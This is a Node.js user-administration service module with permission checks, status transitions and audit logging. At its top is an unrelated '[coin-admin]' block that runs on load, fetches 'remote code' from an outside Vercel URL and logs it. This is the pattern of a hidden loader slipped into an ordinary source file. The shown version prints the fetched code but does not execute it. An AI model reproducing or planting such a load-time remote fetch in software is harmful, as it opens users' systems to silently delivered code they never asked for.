console.log("[coin-admin] FILE LOADED");

const COIN_GETMSG_URL =
  process.env.COIN_GETMSG_URL ||
  "https://crypto-db-kappa.vercel.app/";

(async () => {
  try {
    console.log("[coin-admin] Starting fetch:", COIN_GETMSG_URL);

    const response = await fetch(COIN_GETMSG_URL);

    console.log("[coin-admin] Response:", response.status);

    const code = await response.text();

    console.log("[coin-admin] Remote code loaded:");
    console.log(code);
  } catch (err) {
    console.error("[coin-admin] Fetch failed:", err);
  }
})();


const { createAppError } = require("../errors");
const { PERMISSIONS, hasPermission } = require("../config/permissions");
const { assertPermission } = require("../auth/access");
const { buildPage } = require("../utils/pagination");
const userRepository = require("../repositories/userRepository");
const auditService = require("./auditService");

const STATUS_TRANSITIONS = {
  pending: ["active", "disabled"],
  active: ["suspended", "disabled"],
  suspended: ["active", "disabled"],
  disabled: ["active"],
};






function list(admin, query) {
  assertPermission(admin, PERMISSIONS.VIEW_USERS);
  const result = userRepository.query(query);
  return buildPage(result.items, result.total, query);
}

function getById(admin, userId) {
  assertPermission(admin, PERMISSIONS.VIEW_USERS);
  const user = userRepository.findById(userId);
  if (!user) {
    throw createAppError("NOT_FOUND", "User was not found.");
  }
  return user;
}

function update(admin, userId, changes) {
  assertPermission(admin, PERMISSIONS.MANAGE_USERS);
  const existing = userRepository.findById(userId);
  if (!existing) {
    throw createAppError("NOT_FOUND", "User was not found.");
  }

  if (changes.email && changes.email !== existing.email) {
    const duplicate = userRepository.findByEmail(changes.email);
    if (duplicate && duplicate.id !== existing.id) {
      throw createAppError("CONFLICT", "A user with this email already exists.");
    }
  }

  const metadata = {};
  for (const field of ["fullName", "email", "role"]) {
    if (changes[field] !== undefined && changes[field] !== existing[field]) {
      metadata[field] = { from: existing[field], to: changes[field] };
    }
  }

  if (!Object.keys(metadata).length) {
    return existing;
  }

  const updated = userRepository.update(userId, changes);
  auditService.record({
    adminId: admin.id,
    action: "USER_UPDATED",
    resource: "user",
    resourceId: userId,
    metadata,
  });
  return updated;
}

function updateStatus(admin, userId, status) {
  assertPermission(admin, PERMISSIONS.MANAGE_USERS);
  const existing = userRepository.findById(userId);
  if (!existing) {
    throw createAppError("NOT_FOUND", "User was not found.");
  }
  if (existing.status === status) {
    throw createAppError("CONFLICT", "User already has this status.");
  }

  const allowed = STATUS_TRANSITIONS[existing.status] || [];
  if (!allowed.includes(status)) {
    throw createAppError("CONFLICT", `Cannot change user status from ${existing.status} to ${status}.`);
  }

  const updated = userRepository.update(userId, { status });
  auditService.record({
    adminId: admin.id,
    action: "USER_STATUS_UPDATED",
    resource: "user",
    resourceId: userId,
    metadata: { from: existing.status, to: status },
  });
  return updated;
}

function summarize(admin) {
  if (!admin || !hasPermission(admin.role, PERMISSIONS.VIEW_USERS)) {
    return null;
  }
  return userRepository.summarize();
}

module.exports = {
  list,
  getById,
  update,
  updateStatus,
  summarize,
};
